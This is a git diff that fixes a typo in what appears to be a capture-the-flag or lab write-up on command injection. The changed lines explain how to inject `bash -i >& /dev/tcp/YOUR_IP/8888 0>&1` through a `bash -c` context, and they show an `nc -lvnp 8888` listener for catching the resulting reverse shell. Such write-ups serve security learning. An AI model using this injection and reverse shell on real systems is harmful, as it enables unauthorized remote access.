@@ -110,7 +110,7 @@ your report:
 something
 hi
 ```
-By writing `hi;` we echo hi and end that command, then still in the context of `bash -c ''` we execute `bash -i >& /dev/tcp/YOUR_IP/8888 0>&1;` the last `;` si to ensure that the `>>` appending operation doesnt mess up our reverse shell. Listen with `nc -lvnp 8888` and get your rev shell!</br>
+By writing `hi;` we echo hi and end that command, then still in the context of `bash -c ''` we execute `bash -i >& /dev/tcp/YOUR_IP/8888 0>&1;` the last `;` is to ensure that the `>>` appending operation doesnt mess up our reverse shell. Listen with `nc -lvnp 8888` and get your rev shell!</br>
 
 ### Stabilize shell
 
